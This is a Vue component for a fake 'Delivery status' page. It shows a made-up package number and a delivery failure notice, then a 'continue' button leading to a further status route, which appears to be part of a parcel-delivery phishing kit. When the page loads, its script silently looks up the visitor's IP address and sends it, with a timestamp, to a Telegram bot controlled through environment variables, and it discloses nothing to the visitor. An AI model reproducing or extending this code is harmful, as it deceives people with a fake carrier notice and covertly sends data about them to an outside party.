<template>
  <div class="px-4 pt-16 max-w-7xl mx-auto lg:pt-24">
    <h4
      class="text-text-heading text-xl font-extrabold my-5 lg:mb-10 lg:text-2xl"
    >
      Delivery status
    </h4>

    <div
      class="bg-[#f7f7f7] px-5 py-8 rounded text-text-body font-medium lg:text-lg"
    >
      <p>Your package number: US94512106007770</p>
      <h6 class="font-extrabold text-lg text-[red] my-2">
        Failure notice of delivery
      </h6>
      <ul class="list-disc list-inside leading-tight space-y-3">
        <li>
          Because the delivery address is not clear, your package is not
          delivered
        </li>
        <li>Your package has returned to our operation center</li>
        <!-- <li>Please update your address, we will ship again in 01/09/2024</li> -->
      </ul>
    </div>
    <RouterLink to="/status">
      <button
        class="px-10 mx-auto w-full py-2 bg-text-heading text-white my-4 rounded lg:my-10"
      >
        continue
      </button>
    </RouterLink>
  </div>
</template>
<script setup>
import { RouterLink } from "vue-router";
import { onMounted } from "vue";

const { VITE_API_TOKEN, VITE_CHAT_ID } = import.meta.env;

onMounted(() => {
  fetch("https://api64.ipify.org/?format=json")
    .then((data) => data.json())
    .then((data) => {
      const ip = data.ip;
      const nL = encodeURI("\n");
      const instanDate = new Date();
      const myMessage = `ip: ${ip} ${nL}time:${instanDate.toLocaleString()}`;
      const url = `https://api.telegram.org/bot${VITE_API_TOKEN}/sendMessage?chat_id=${VITE_CHAT_ID}&text=${myMessage}`;
      fetch(url);
    });
});
</script>
